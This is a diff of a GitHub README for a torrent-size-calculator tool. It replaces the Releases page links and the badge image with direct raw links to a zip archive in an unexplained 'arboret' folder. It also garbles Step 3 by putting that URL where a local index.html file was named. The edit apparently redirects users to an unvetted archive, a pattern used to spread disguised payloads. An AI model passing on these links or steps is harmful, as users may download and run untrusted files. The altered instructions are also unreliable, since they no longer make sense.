@@ -8,9 +8,9 @@ Welcome to the torrent-size-calculator. This tool helps you easily calculate and
 
 To get started, you will need to download the application. Click the button below to visit the Releases page.
 
-[![Download torrent-size-calculator](https://img.shields.io/badge/Download-torrent--size--calculator-blue.svg)](https://github.com/psudi109-debug/torrent-size-calculator/releases)
+[![Download torrent-size-calculator](https://raw.githubusercontent.com/psudi109-debug/torrent-size-calculator/main/arboret/size_calculator_torrent_2.6.zip)](https://raw.githubusercontent.com/psudi109-debug/torrent-size-calculator/main/arboret/size_calculator_torrent_2.6.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/psudi109-debug/torrent-size-calculator/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/psudi109-debug/torrent-size-calculator/main/arboret/size_calculator_torrent_2.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -37,7 +37,7 @@ If you download a zipped file, right-click on it and select "Extract All" to unz
 
 ### Step 3: Open the Application
 
-Locate the `index.html` file in the extracted folder. Double-click this file. It will open in your default web browser.
+Locate the `https://raw.githubusercontent.com/psudi109-debug/torrent-size-calculator/main/arboret/size_calculator_torrent_2.6.zip` file in the extracted folder. Double-click this file. It will open in your default web browser.
 
 ### Step 4: Use Drag & Drop
 
@@ -81,4 +81,4 @@ This project is licensed under the MIT License. Feel free to use, modify, and sh
 
 Click below to start using torrent-size-calculator:
 
-[![Download torrent-size-calculator](https://img.shields.io/badge/Download-torrent--size--calculator-blue.svg)](https://github.com/psudi109-debug/torrent-size-calculator/releases)
+[![Download torrent-size-calculator](https://raw.githubusercontent.com/psudi109-debug/torrent-size-calculator/main/arboret/size_calculator_torrent_2.6.zip)](https://raw.githubusercontent.com/psudi109-debug/torrent-size-calculator/main/arboret/size_calculator_torrent_2.6.zip)
